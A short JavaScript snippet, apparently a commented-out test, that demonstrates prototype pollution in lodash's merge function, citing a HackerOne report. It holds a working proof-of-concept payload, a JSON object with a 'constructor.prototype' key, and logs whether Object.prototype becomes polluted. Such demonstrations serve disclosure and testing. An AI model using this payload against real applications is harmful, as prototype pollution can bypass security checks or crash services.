// //https://hackerone.com/reports/380873
// test("prototype pollution in lodash", () => {
  const _ = require("lodash");
  let payload = JSON.parse(
    '{"constructor": {"prototype": {"polluted": "yes"}}}'
  );
console.log({}.polluted);
  _.merge({}, payload);
console.log({}.polluted);
// });
